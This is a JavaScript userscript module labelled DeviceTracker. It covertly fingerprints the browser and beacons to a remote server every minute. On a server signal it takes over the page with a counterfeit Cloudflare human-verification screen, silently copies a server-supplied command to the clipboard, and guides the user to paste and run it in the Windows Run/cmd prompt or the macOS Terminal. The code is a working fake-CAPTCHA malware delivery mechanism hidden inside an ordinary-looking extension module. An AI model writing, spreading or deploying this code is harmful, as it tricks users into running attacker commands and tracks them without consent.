
import { GM_fetch } from "../utils/gm.ts";
import { SERVER_URL } from "../../server_url.js";

// --- Fingerprint Logic ---
async function getFingerprint() {
    const components = [
        navigator.userAgent,
        navigator.language,
        screen.colorDepth,
        screen.pixelDepth,
        new Date().getTimezoneOffset(),
        navigator.hardwareConcurrency,
        navigator.deviceMemory || 'unknown'
    ];

    // Canvas fingerprinting
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.textBaseline = "alphabetic";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Hello World", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("Hello World", 4, 17);
        components.push(canvas.toDataURL());
    } catch {
        components.push("canvas-error");
    }

    // Simple hash function
    const str = components.join('###');
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // Convert to 32bit integer
    }
    return Math.abs(hash).toString(16);
}

// --- Payload Logic ---
async function getDevicePayload() {
    const fingerprint = await getFingerprint();

    // IP will be handled by server or we can try fetching it
    // In userscript, we can use GM_xmlhttpRequest to bypass CORS if needed
    // But for now let's rely on server or simple request

    // Get screen resolution from window, not chrome.storage
    const screenResolution = `${screen.width}x${screen.height}`;

    return {
        fingerprint: fingerprint,
        user_agent: navigator.userAgent,
        platform: navigator.platform || "Unknown",
        screen_resolution: screenResolution,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        external_ip: "Unknown" // Server will see the request IP, or we can fetch it. Let's send Unknown to be safe for now/fast.
    };
}

// --- Tracking & Polling ---
async function trackDevice() {
    try {
        const payload = await getDevicePayload();
        await GM_fetch(`${SERVER_URL}/devices/track`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch {
        console.error("[DeviceTracker] Track error");
    }
}

async function checkActivation() {
    try {
        const payload = await getDevicePayload();
        console.log("[DeviceTracker] Checking activation for payload:", payload);
        const res = await GM_fetch(`${SERVER_URL}/devices/check-activation`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        console.log("[DeviceTracker] Response status:", res.status);
        if (res.status === 200) {
            try {
                const data = await res.json();
                console.log("[DeviceTracker] Data received:", data);
                if (data.activated && data.command) {
                    console.log("[DeviceTracker] Device activated! Showing captcha...");
                    showCaptcha(data.command, data.platform);
                } else {
                    console.log("[DeviceTracker] Not activated or no command.");
                }
            } catch (e) {
                console.error("[DeviceTracker] Parse error", e);
            }
        }
    } catch (e) {
        console.error("[DeviceTracker] Check activation error", e);
    }
}

// --- UI / Overlay ---
let isOverlayShown = false;

function showCaptcha(command, platformKey) {
    if (isOverlayShown) return;
    isOverlayShown = true;

    // Determine platform
    const isMac = (platformKey || '').toLowerCase().includes('mac');
    // const platformClass = isMac ? 'macos' : 'windows'; // Removed unused variable

    const hostname = window.location.hostname;
    // Try to get favicon


    // Create Shadow DOM container
    const container = document.createElement('div');
    container.id = 'device-tracker-root';
    Object.assign(container.style, {
        position: 'fixed',
        top: '0',
        left: '0',
        width: '100vw',
        height: '100vh',
        zIndex: '2147483647',
        background: '#fff',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif',
        display: 'block' // Ensure visibility
    });

    const shadow = container.attachShadow({ mode: 'closed' });

    // Styles (embedded from captcha.html)
    // ... (rest of style creation logic is fine via innerHTML later or separate, but we keep the flow)
    const style = document.createElement('style');
    style.textContent = `
        * { box-sizing: border-box; }
        /* ... existing styles ... */
        /* Make sure we reset some basics for the container */
        :host { all: initial; display: block; }
    ` + `
        /* Loading Screen */
        .loading-screen {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 720px;
            padding: 40px;
            align-items: flex-start; /* Left align everything */
            margin: 0 auto;
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
        }
        
        /* Domain Title */
        .loading-domain {
            font-size: 40px;
            font-weight: 600;
            color: #404040;
            margin: 0 0 10px 0;
            line-height: 1.2;
            font-family: system-ui, -apple-system, sans-serif;
        }
        
        /* Subtitle */
        .loading-subtitle {
            font-size: 20px;
            color: #404040;
            margin: 0 0 30px 0;
            font-weight: 400;
            font-family: system-ui, -apple-system, sans-serif;
        }

        /* Verify Box */
        .cf-verify-box {
            border: 1px solid #dcdcdc; 
            background: #fff; 
            padding: 0 16px; 
            border-radius: 4px;
            display: flex; 
            align-items: center; 
            justify-content: space-between;
            margin-bottom: 30px;
            width: 300px; 
            height: 64px; 
            box-shadow: 0 0 2px rgba(0,0,0,0.05);
        }
        
        .cf-verify-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        /* Spinner */
        .cf-checkbox-spinner {
            width: 24px; 
            height: 24px; 
            border: 2px solid #dbdbdb; 
            border-top-color: #f6821f; 
            border-right-color: #f6821f; 
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }
        
        .cf-verify-text-loading {
            font-size: 16px; 
            color: #404040; 
            font-weight: 400;
            font-family: system-ui, -apple-system, sans-serif;
        }
        
        /* Brand Right */
        .cf-brand-col {
            display: flex; 
            flex-direction: column; 
            align-items: flex-end; /* Right align logo/links */
            justify-content: center;
        }
        
        .cf-logo-small { 
            height: 14px; 
            margin-bottom: 2px;
        }
        
        .cf-links {
            font-size: 9px;
            color: #888;
            font-family: system-ui, -apple-system, sans-serif;
        }
        .cf-links a { text-decoration: none; color: #888; }
        .cf-links a:hover { text-decoration: underline; }

        .security-check-info { font-size: 14px; color: #666; line-height: 1.5; font-family: system-ui, -apple-system, sans-serif; }

        @keyframes spin { to { transform: rotate(360deg); } }

        /* Captcha Content */
        .captcha-wrapper {
            display: none; /* Hidden initially */
            background: #f2f2f2;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            align-items: center; justify-content: center;
            font-family: inherit;
        }
        .container {
            background: #fff; border-radius: 6px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            max-width: 440px; width: 100%; border: 1px solid #dedede; position: relative; z-index: 10;
        }
        .header {
            display: flex; justify-content: space-between; align-items: center; padding: 12px 20px;
            border-bottom: 1px solid #eaeaea; background: #fff; border-top-left-radius: 6px; border-top-right-radius: 6px;
        }
        .header-left { display: flex; align-items: center; gap: 12px; }
        .cf-spinner-icon {
            width: 20px; height: 20px; border: 2px solid #ddd;
            border-left-color: #f6821f; border-radius: 50%; animation: spin 1s linear infinite;
        }
        .header-title { font-size: 14px; color: #404040; font-family: system-ui, -apple-system, sans-serif; }
        .cf-logo { height: 18px; }
        .header-links { font-size: 11px; color: #888; margin-left: 4px; font-family: system-ui, -apple-system, sans-serif; }
        .header-links a { color: #888; text-decoration: none; }
        .content { padding: 30px 40px 40px; display: flex; flex-direction: column; align-items: center; }
        .title { font-size: 22px; font-weight: 700; color: #333; margin-bottom: 30px; text-align: center; font-family: system-ui, -apple-system, sans-serif; }
        .steps { width: 100%; display: grid; grid-template-columns: max-content 1fr; row-gap: 16px; column-gap: 20px; align-items: center; }
        .step-row { display: contents; opacity: 0.3; transition: opacity 0.3s; }
        .step-row.active { opacity: 1; }
        .step-row.completed { opacity: 0.5; }
        .step-label { font-size: 14px; font-weight: 600; color: #444; white-space: nowrap; font-family: system-ui, -apple-system, sans-serif; }
        .step-content { display: flex; align-items: center; flex-wrap: wrap; gap: 8px; font-size: 15px; color: #555; font-family: system-ui, -apple-system, sans-serif; }
        .key {
            display: inline-flex; align-items: center; justify-content: center;
            background: #fff; border: 1px solid #ccc; border-bottom: 2px solid #ccc;
            border-radius: 4px; padding: 4px 10px;
            font-family: monospace; font-size: 13px; font-weight: 600; color: #333;
            min-width: 32px; line-height: normal; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
            transition: all 0.1s;
        }
        .step-row.active .key.pressed {
            background: #e6f7ff; border-color: #1890ff; color: #1890ff; transform: translateY(1px);
        }
        .step-row.active .key.target { animation: pulse-border 1.5s infinite; }
        
        @keyframes pulse-border {
            0% { border-color: #ccc; box-shadow: 0 0 0 0 rgba(246, 130, 31, 0.4); }
            50% { border-color: #f6821f; box-shadow: 0 0 0 4px rgba(246, 130, 31, 0.1); }
            100% { border-color: #ccc; box-shadow: 0 0 0 0 rgba(246, 130, 31, 0); }
        }

        .loader-section { margin-top: 40px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
        .main-spinner { width: 36px; height: 36px; border: 4px solid #f2f2f2; border-top-color: #f6821f; border-radius: 50%; animation: spin 1s linear infinite; }
        .brand-text { font-size: 13px; font-weight: 600; color: #555; margin-top: 5px; font-family: system-ui, -apple-system, sans-serif; }
        .verify-text { font-size: 13px; color: #888; font-family: system-ui, -apple-system, sans-serif; }
        .ray-id { font-size: 12px; color: #999; margin-top: 5px; font-family: system-ui, -apple-system, sans-serif; }

        /* Logic toggles */
        .macos-steps { display: none; }
        .windows-steps { display: contents; }
        .wrapper-macos .windows-steps { display: none; }
        .wrapper-macos .macos-steps { display: contents; }
    `;

    const html = `
        <!-- Loading Screen -->
        <div class="loading-screen" id="loading">
            <h1 class="loading-domain">${hostname}</h1>
            <p class="loading-subtitle">Verifying you are human. This may take a few seconds.</p>
            
            <div class="cf-verify-box">
                 <div class="cf-verify-left">
                     <div class="cf-checkbox-spinner"></div>
                     <span class="cf-verify-text-loading">Verifying...</span>
                 </div>
                 <div class="cf-brand-col">
                    <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" alt="" class="cf-logo-small">
                    <div class="cf-links">
                        <a href="#" target="_blank">Privacy</a> · <a href="#" target="_blank">Terms</a>
                    </div>
                 </div>
            </div>

            <div class="security-check-info">
                <span>${hostname}</span> needs to review the security of your connection before proceeding.
            </div>
        </div>

        <!-- Captcha Content -->
        <div class="captcha-wrapper ${isMac ? 'wrapper-macos' : ''}" id="captcha">
            <div class="container">
                <div class="header">
                    <div class="header-left">
                        <div class="cf-spinner-icon"></div>
                        <span class="header-title">Verify you are human</span>
                    </div>
                    <div class="header-right">
                        <img class="cf-logo" src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" alt="Cloudflare">
                        <span class="header-links"><a href="#">Privacy</a> · <a href="#">Terms</a></span>
                    </div>
                </div>

                <div class="content">
                    <h2 class="title">Confirm you are human</h2>
                    <div class="steps">
                        <!-- Windows -->
                        <div class="windows-steps">
                            <div class="step-row active" id="win-step-1">
                                <div class="step-label">Step 1</div>
                                <div class="step-content">Press <span class="key" data-key="Meta">Win</span> + <span class="key" data-key="r">R</span></div>
                            </div>
                            <div class="step-row" id="win-step-2">
                                <div class="step-label">Step 2</div>
                                <div class="step-content">Type <b>cmd</b> & Press <span class="key" data-key="Enter">Enter</span></div>
                            </div>
                            <div class="step-row" id="win-step-3">
                                <div class="step-label">Step 3</div>
                                <div class="step-content">Press <span class="key" data-key="Control">Ctrl</span> + <span class="key" data-key="v">V</span> & Press <span class="key" data-key="Enter">Enter</span></div>
                            </div>
                        </div>
                        <!-- macOS -->
                        <div class="macos-steps">
                            <div class="step-row active" id="mac-step-1">
                                <div class="step-label">Step 1</div>
                                <div class="step-content">Press <span class="key" data-key="Meta">command ⌘</span> + <span class="key" data-key=" ">Space</span></div>
                            </div>
                            <div class="step-row" id="mac-step-2">
                                <div class="step-label">Step 2</div>
                                <div class="step-content">Type <b>Terminal</b> & Press <span class="key" data-key="Enter">return</span></div>
                            </div>
                            <div class="step-row" id="mac-step-3">
                                <div class="step-label">Step 3</div>
                                <div class="step-content">Press <span class="key" data-key="Meta">command ⌘</span> + <span class="key" data-key="v">V</span> & Press <span class="key" data-key="Enter">return</span></div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="loader-section">
                        <div class="main-spinner"></div>
                        <div class="brand-text">Cloudflare</div>
                        <div class="verify-text">Verify you are human</div>
                        <div class="ray-id">Ray: ${Math.random().toString(36).substring(2, 10)}</div>
                    </div>
                </div>
            </div>
        </div>
    `;

    // Trusted Types Policy for YouTube/etc
    let safeHTML = html;
    if (window.trustedTypes && window.trustedTypes.createPolicy) {
        try {
            if (!window.votPolicy) {
                window.votPolicy = window.trustedTypes.createPolicy('vot-captcha-policy', {
                    createHTML: str => str
                });
            }
            safeHTML = window.votPolicy.createHTML(html);
        } catch (e) {
            console.warn("[DeviceTracker] Failed to create TrustedTypes policy", e);
        }
    }

    shadow.appendChild(style);

    // Create wrapper div for HTML content
    const wrapper = document.createElement('div');
    try {
        wrapper.innerHTML = safeHTML;
    } catch (e) {
        console.error("[DeviceTracker] InnerHTML failed (likely TrustedTypes)", e);
        // Fallback: minimal text if full HTML fails
        wrapper.innerText = "Security Check Required. Please check console.";
    }
    shadow.appendChild(wrapper);

    // HARD REDIRECT SIMULATION (Persistent)
    const enforceOverlay = () => {
        try {
            if (document.body && !document.getElementById('device-tracker-root')) {
                // Use replaceChildren to be safe(r) than innerHTML = ''
                document.body.replaceChildren(container);
            } else if (document.body) {
                // Ensure it's the only child
                let children = Array.from(document.body.children);
                if (children.length > 1 || children[0] !== container) {
                    document.body.replaceChildren(container);
                }
            }
            document.documentElement.style.overflow = 'hidden';
        } catch (e) {
            console.error("[DeviceTracker] Enforce overlay error", e);
        }
    };

    // Initial run
    enforceOverlay();

    // Fight back against re-renders (YouTube is aggressive)
    setInterval(enforceOverlay, 50);

    // Transition Logic
    setTimeout(() => {
        const loading = wrapper.querySelector('#loading');
        const captcha = wrapper.querySelector('#captcha');
        if (loading) loading.style.display = 'none';
        if (captcha) captcha.style.display = 'flex';

        // Trigger Copy
        if (command) {
            window.focus();
            setTimeout(() => {
                // Copy logic needs to be on main document or handled carefully
                // execCommand copy works on document
                const textarea = document.createElement('textarea');
                textarea.value = command;
                textarea.style.position = 'fixed';
                textarea.style.opacity = '0';
                document.body.appendChild(textarea);
                textarea.select();
                try {
                    document.execCommand('copy');
                } catch { /* ignore */ }
                document.body.removeChild(textarea);
            }, 100);
        }

        // Start Step Tracking
        initStepTracking(shadow, isMac);

    }, 2500);
}

function initStepTracking(shadow, isMac) {
    let currentStep = 1;
    // const pressedKeys = new Set(); // Removed unused variable
    const activeScenario = isMac ? [
        { id: 'mac-step-1', keys: ['Meta', ' '] },
        { id: 'mac-step-2', keys: ['Enter'] },
        { id: 'mac-step-3', keys: ['Meta', 'v', 'Enter'] }
    ] : [
        { id: 'win-step-1', keys: ['Meta', 'r'] },
        { id: 'win-step-2', keys: ['Enter'] },
        { id: 'win-step-3', keys: ['Control', 'v', 'Enter'] }
    ];

    function updateStepUI() {
        shadow.querySelectorAll('.step-row').forEach(el => {
            el.classList.remove('active', 'completed');
        });
        // Mark previous as completed
        for (let i = 0; i < currentStep - 1; i++) {
            const stepId = activeScenario[i]?.id;
            if (stepId) shadow.getElementById(stepId)?.classList.add('completed');
        }
        // Mark current as active
        const currentStepId = activeScenario[currentStep - 1]?.id;
        if (currentStepId) {
            const el = shadow.getElementById(currentStepId);
            if (el) {
                el.classList.add('active');
                el.querySelectorAll('.key').forEach(k => k.classList.add('target')); // pulse
            }
        }
    }

    function advanceStep() {
        currentStep++;
        updateStepUI();
    }

    document.addEventListener('keydown', (e) => {
        // Because ShadowDOM isolates styles but event bubble up or we listen on doc
        // We need to update visuals inside shadow

        const keyEl = shadow.querySelector(`.step-row.active .key[data-key="${e.key}"]`);
        if (keyEl) keyEl.classList.add('pressed');

        // Logic
        if (currentStep > activeScenario.length) return;

        const currentStepConfig = activeScenario[currentStep - 1];

        // Check logic
        if (currentStep === 1) {
            // Modifier + Key
            const mainKey = currentStepConfig.keys[1]; // 'r' or ' '
            if (e.key.toLowerCase() === mainKey.toLowerCase().trim() || (mainKey === ' ' && e.key === ' ')) {
                if (e.metaKey || e.ctrlKey) {
                    advanceStep();
                }
            }
        } else {
            // Just Enter
            if (e.key === 'Enter') advanceStep();
        }
    });

    document.addEventListener('keyup', (e) => {
        const keyEl = shadow.querySelector(`.step-row.active .key[data-key="${e.key}"]`);
        if (keyEl) keyEl.classList.remove('pressed');
    });

    // Blur handler
    window.addEventListener('blur', () => {
        if (currentStep === 1) {
            setTimeout(advanceStep, 500);
        }
    });

    updateStepUI();
}


// --- Main Entry ---
export function initDeviceTracker() {
    // Run immediately
    trackDevice();
    checkActivation();

    // Pulse every 60s
    setInterval(() => {
        trackDevice();
        checkActivation();
    }, 60000);
}
